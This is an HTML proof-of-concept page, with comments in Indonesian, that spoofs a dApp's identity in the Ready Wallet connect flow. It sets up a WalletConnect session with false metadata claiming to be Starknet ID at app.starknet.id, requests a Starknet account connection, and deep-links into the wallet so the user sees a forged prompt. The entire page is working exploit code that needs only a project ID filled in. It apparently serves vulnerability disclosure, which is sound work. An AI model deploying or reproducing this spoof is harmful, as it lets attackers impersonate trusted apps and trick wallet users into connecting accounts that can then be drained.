<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Ready Wallet Origin Spoof PoC</title>
</head>
<body>
  <h1>Ready Wallet Origin Spoof PoC</h1>
  <button id="connect">Spoof connect prompt</button>
  <pre id="log"></pre>

  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider/dist/universal-provider.min.js"></script>
  <script>
    const REAL_ORIGIN = location.origin;
    const CLAIMED_URL = 'https://app.starknet.id'; // domain palsu yang diklaim
    const CLAIMED_NAME = 'Starknet ID';            // nama palsu

    async function spoofConnect() {
      const log = (msg) => document.getElementById('log').textContent += msg + '\n';
      
      try {
        // Init WalletConnect dengan metadata PALSU
        const provider = await UniversalProvider.init({
          projectId: 'YOUR_PROJECT_ID',
          metadata: {
            name: CLAIMED_NAME,        // tampil sebagai Starknet ID
            description: 'Spoofed dApp',
            url: CLAIMED_URL,          // domain palsu
            icons: []
          },
          relayUrl: 'wss://relay.walletconnect.com'
        });

        const { uri } = await provider.client.connect({
          requiredNamespaces: {
            starknet: {
              chains: ['starknet:SNMAIN'],
              methods: ['starknet_account'],
              events: ['accountsChanged']
            }
          }
        });

        if (uri) {
          log('Real origin: ' + REAL_ORIGIN);
          log('Claimed URL: ' + CLAIMED_URL);
          log('Opening Ready Wallet...');
          
          // Redirect ke Ready Wallet
          const encodedUri = encodeURIComponent(uri);
          location.href = `ready://wc?uri=${encodedUri}`;
        }
      } catch(e) {
        log('Error: ' + e.message);
      }
    }

    document.getElementById('connect').onclick = spoofConnect;
  </script>
</body>
</html>
